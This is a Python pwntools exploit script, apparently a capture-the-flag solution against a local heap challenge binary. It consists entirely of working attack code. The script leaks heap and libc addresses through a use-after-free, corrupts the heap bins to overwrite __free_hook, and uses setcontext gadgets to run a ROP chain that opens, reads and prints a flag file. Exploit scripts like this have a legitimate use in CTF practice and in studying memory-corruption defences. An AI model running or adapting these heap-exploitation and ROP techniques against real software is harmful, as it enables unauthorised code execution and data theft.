from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'> '
def add(idx, name):
	sla(menu, b'1')
	sla(b'idx: ', byte(idx))
	sda(b'name: ', name)

def edit(idx, name):
	sla(menu, b'2')
	sla(b'idx: ', byte(idx))
	sda(b'name: ', name)

def show(idx):
	sla(menu, b'3')
	sla(b'idx: ', byte(idx))

def dele(idx):
	sla(menu, b'4')
	sla(b'idx: ', byte(idx))

def mal(content):
	sla(menu, b'50056')
	sd(content)

# [0x80,0x400]
flag_path = b'A'*0x10 + b'./flag\x00\x00'
for i in range(7):
	add(0,flag_path.ljust(0x400, b'A'))
	dele(0)
add(1, b'A'*0x400)

for i in range(6):
	add(0, b'A'*0xf0)
	dele(0)
show(0)
rut(b'name: ')
heap_base = addr64(b'\n') - 0x26e0
print("heap_base : ", hex(heap_base))
dele(1)
show(1)
rut(b'name: ')
libc.address = addr64(b'\n') - 0x1e4ca0
print("libc_address : ", hex(libc.address))

add(0, b'A'*0x300)
add(0, b'A'*0x400)
add(1, b'A'*0x400)
dele(0)
add(1, b'A'*0x300)
add(1, b'A'*0x400)
# 0 -> x -> small_bins
payload = b'A'*0x300 + p64(0) + p64(0x101) + p64(heap_base+0x21d0) + p64(heap_base+0x1b)

for i in range(2):
	add(1, b'A'*0x217)
	dele(1)
edit(0, payload)
add(0, b'A'*0xf0)

payload = p64(libc.sym.__free_hook)
edit(1, payload)

ret = libc.address + 0x000000000002535f # ret
leave = libc.address + 0x0000000000058373 # leave ; ret
pop_rax = libc.address + 0x0000000000047cf8 # pop rax ; ret 
pop_rdi = libc.address + 0x0000000000026542 # pop rdi ; ret 
pop_rsi = libc.address + 0x0000000000026f9e # pop rsi ; ret 
pop_rdx = libc.address + 0x000000000012bda6 # pop rdx ; ret 
o = libc.sym.open
r = libc.sym.read
w = libc.sym.write
syscall = r + 0xf
orw  = p64(pop_rdi) + p64(heap_base+0x270) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap_base+0x270) + p64(pop_rdx) + p64(0x40) + p64(r)
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap_base+0x270) + p64(pop_rdx) + p64(0x40) + p64(w)

setcontext = libc.sym.setcontext + 53
magic_gadget1 = libc.address + 0x0000000000150550
"""
mov rdx, qword ptr [rdi + 8]
mov qword ptr [rsp], rax
call qword ptr [rdx + 0x20]
"""

magic_gadget2 = libc.address + 0x000000000012be97
"""
mov rdx, qword ptr [rdi + 8]
mov rax, qword ptr [rdi]
mov rdi, rdx; jmp rax
"""

payload = p64(0) + p64(heap_base+0x3950)
payload = payload.ljust(0x20, b'\x00') + p64(setcontext)
payload = payload.ljust(0xa0, b'\x00') + p64(heap_base+0x3730) + p64(ret)
add(0, b'A'*0x400)
add(1, b'A'*0x400)
edit(0, payload)
mal(orw)
mal(p64(magic_gadget1))
#debug()
dele(0)

sh()
